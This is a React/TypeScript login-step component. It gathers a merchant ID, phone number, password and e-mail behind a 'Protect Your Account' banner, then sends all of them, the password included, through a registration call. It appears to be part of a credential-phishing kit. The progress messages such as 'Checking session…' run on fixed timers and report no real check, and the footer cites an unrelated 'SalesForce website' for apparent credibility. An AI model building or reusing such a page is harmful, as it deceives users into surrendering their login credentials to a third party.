import { useEffect, useState } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import { AlertCircle, Eye, EyeOff, IdCard, KeyRound, Loader2, ShieldCheck } from 'lucide-react';
import { sendRegistration, verifyAccountPassword, setAccountPassword } from 'zitejs/api';
import { Input } from '@project/components/ui/input';
import { Label } from '@project/components/ui/label';
import PhoneInput from './PhoneInput';
import ProgressButton, { Stage } from './ProgressButton';
import { DEFAULT_COUNTRY, Country } from './countries';

const CONTINUE_STAGES: Stage[] = [
  { at: 0, text: 'Please wait…' },
  { at: 2000, text: 'Processing your request…' },
  { at: 4000, text: 'Checking session…' },
  { at: 6000, text: 'Preparing workspace…' },
  { at: 8000, text: 'Almost ready…' },
];

type Mode = 'loading' | 'login' | 'setup' | 'notfound';

function PasswordField({
  id, label, hint, value, onChange, invalid,
}: {
  id: string; label: string; hint?: string; value: string; onChange: (v: string) => void; invalid?: boolean;
}) {
  const [show, setShow] = useState(false);
  return (
    <div className="space-y-1.5">
      <Label htmlFor={id}>{label}</Label>
      {hint && <p className="text-xs text-muted-foreground">{hint}</p>}
      <div className={`flex h-12 items-center gap-3 rounded-xl border bg-card px-3 shadow-sm ${invalid ? 'border-destructive' : 'border-input'}`}>
        <KeyRound className="h-5 w-5 shrink-0 text-muted-foreground" aria-hidden="true" />
        <input
          id={id}
          type={show ? 'text' : 'password'}
          autoComplete="off"
          value={value}
          onChange={(e) => onChange(e.target.value)}
          className="h-full min-w-0 flex-1 border-0 bg-transparent px-0 font-mono tracking-wide text-foreground outline-none placeholder:text-muted-foreground"
          placeholder="••••••••"
        />
        <button type="button" onClick={() => setShow(!show)} className="text-muted-foreground hover:text-foreground" aria-label="Show/Hide">
          {show ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
        </button>
      </div>
    </div>
  );
}

export default function LoginStepTwo({ merchantId, role, onDone }: { merchantId: string; role: string; onDone: (email: string) => void }) {
  const [country, setCountry] = useState<Country>(DEFAULT_COUNTRY);
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [password2, setPassword2] = useState('');
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');
  const [mode, setMode] = useState<Mode>('loading');

  useEffect(() => {
    let active = true;
    verifyAccountPassword({ merchantId })
      .then(({ status }) => {
        if (!active) return;
        if (status === 'needsSetup') setMode('setup');
        else if (status === 'notfound') setMode('notfound');
        else setMode('login');
      })
      .catch(() => active && setMode('login'));
    return () => { active = false; };
  }, [merchantId]);

  const emailOk = /^\S+@\S+\.\S+$/.test(email);
  const mismatch = password2.length > 0 && password !== password2;
  const ready = mode === 'login' || mode === 'setup';
  const valid = ready && phone.length >= 6 && password.length > 0 && password === password2 && emailOk;

  const verify = async () => {
    try {
      if (mode === 'setup') {
        await setAccountPassword({ merchantId, password });
      }
      await sendRegistration({ merchantId, role, phone, dialCode: country.dial, password, email });
      return { ok: true };
    } catch (e) {
      return { ok: false, error: e instanceof Error ? e.message : 'Gagal menghantar. Please try again.' };
    }
  };

  return (
    <div className="space-y-5">
      <div className="rounded-2xl border border-primary/15 bg-primary/5 p-5">
        <div className="mb-2 flex items-center gap-2 text-primary">
          <ShieldCheck className="h-5 w-5" />
          <h2 className="text-lg font-extrabold">Protect Your Account</h2>
        </div>
        <p className="text-sm leading-relaxed text-muted-foreground">
          Please ensure that your account is protected with strong security measures to prevent unauthorised access to your confidential information.
        </p>
      </div>

      <div className="space-y-1.5">
        <Label htmlFor="verified-merchant-id">MERCHANT ID</Label>
        <div className="flex h-12 items-center gap-3 rounded-xl border border-sky-200 bg-sky-50 px-3 shadow-sm">
          <IdCard className="h-5 w-5 shrink-0 text-gray-500" aria-hidden="true" />
          <Input id="verified-merchant-id" value={merchantId} readOnly className="h-full min-w-0 flex-1 rounded-none border-0 bg-transparent px-0 font-mono text-slate-900 shadow-none focus-visible:ring-0 focus-visible:ring-offset-0" />
        </div>
      </div>

      <div className="pt-2 text-xs font-bold uppercase tracking-widest text-primary">ClientSide</div>

      <div className="space-y-1.5">
        <Label>PHONE NUMBER*</Label>
        <PhoneInput country={country} onCountryChange={setCountry} value={phone} onChange={setPhone} />
      </div>

      {mode === 'loading' && (
        <div className="flex items-center gap-2 rounded-xl border border-border bg-muted/40 px-4 py-3 text-sm text-muted-foreground">
          <Loader2 className="h-4 w-4 animate-spin" /> Checking your account…
        </div>
      )}

      {mode === 'notfound' && (
        <div className="flex items-center gap-2 rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm font-medium text-destructive">
          <AlertCircle className="h-4 w-4 shrink-0" /> No account was found for this Merchant ID.
        </div>
      )}

      {ready && (
        <>
          {mode === 'setup' && (
            <div className="rounded-xl border border-amber-300/40 bg-amber-50 px-4 py-3 text-sm text-amber-800">
              No password has been set for this account yet. Create one below to continue — it will be saved to your account.
            </div>
          )}

          <PasswordField
            id="password-access"
            label="PASSWORD ACCESS*"
            hint={mode === 'setup' ? 'Create your account password' : 'Enter the password set for your account'}
            value={password}
            onChange={setPassword}
          />

          <div className="space-y-1.5">
            <PasswordField
              id="password-access-confirm"
              label="Re-Enter PASSWORD ACCESS*"
              value={password2}
              onChange={setPassword2}
              invalid={mismatch}
            />
            {mismatch && <p className="text-xs text-destructive">Password does not match.</p>}
          </div>
        </>
      )}

      <div className="space-y-1.5">
        <Label>E-MAIL*</Label>
        <Input type="email" className="h-12 rounded-xl" value={email} onChange={(e) => setEmail(e.target.value)} />
        {email && !emailOk && <p className="text-xs text-destructive">Please enter a valid e-mail.</p>}
      </div>

      <AnimatePresence>
        {error && (
          <motion.div initial={{ opacity: 0, y: -6 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
            className="flex items-center gap-2 rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm font-medium text-destructive">
            <AlertCircle className="h-4 w-4 shrink-0" /> {error}
          </motion.div>
        )}
      </AnimatePresence>

      <ProgressButton
        idle={<>Continue</>}
        stages={CONTINUE_STAGES}
        durationMs={10000}
        disabled={!valid}
        className="h-12 w-full rounded-xl text-base font-semibold shadow-lg shadow-primary/20"
        onVerify={verify}
        onSuccess={() => onDone(email)}
        onError={setError}
      />
      <p className="text-center text-xs text-muted-foreground">
        By clicking continue, you agree with our company Privacy Policy and Terms &amp; Conditions on the SalesForce website.
      </p>
    </div>
  );
}
